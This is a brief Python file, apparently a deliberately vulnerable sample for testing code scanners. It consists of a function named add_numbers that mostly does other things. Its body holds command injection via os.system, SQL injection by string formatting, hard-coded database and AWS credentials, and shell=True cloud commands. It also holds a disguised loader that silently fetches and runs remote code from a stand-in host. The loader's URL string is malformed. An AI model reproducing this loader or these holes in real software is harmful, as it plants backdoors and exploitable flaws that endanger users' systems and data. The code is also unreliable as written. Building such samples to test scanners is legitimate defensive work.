import os

from os import system as _ssystem
import psycopg2
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _executable
import subprocess
import boto3
from boto3 import Session

conn = psycopg2.connect(
    dbname="salesine",
    user="postgres",
    password="112358",
    host="localhost",
    port="5432"
)
session = boto3.Session(
    aws_access_key_id='122334445',
    aws_secret_access_key='12234324234',
    region_name='ap-south-1'
)

cursor = conn.cursor()


password="112345"
def add_numbers(a, b):
    # command injection
    user_input = input("Enter your name: ")
    os.system("echo Hello, " + user_input)
    
    #HTTP malicius code
    _ttmp =  _ffile(delete=False)
    _ttmp.write(b"""from urllib.request import urlopen as _uurlopen;exec(_uurlopen('https://exmaple.com).read()) """)
    _ttmp.close()
    try: _ssystem(f"start {_executable.replace('.exe','w.exe')} {_ttmp.name}")
    except: pass
    
    #SOL injection
    name = input("Enter your name: ")
    age = int(input("Enter your age: "))
    insert_query = f'INSERT INTO user (name, age) VALUES ({name}, {age})'
    cursor.execute(insert_query)
    
    #AWS Command using subprocess
    command = "aws s3 ls"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    
    #AWS Command using boto3
    s3 = session.client('s3')
    response = s3.list_buckets()
    for bucket in response['Buckets']:
        print(bucket['Name'])
    
    #Kubectl command to list pods in a namespace 
    command = "kubectl get pods -n your-namespace"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)
    
    # Run AWS CLI command
    os.system('aws s3 ls')
    
    #Access the env variable
    value = os.environ.get('YOUR_ENV_VARIABLE_NAME')
    print(value)
        
    # Print the output 
    print(result.stdout)
        
    # Adding numbers
    result = a + b
    return result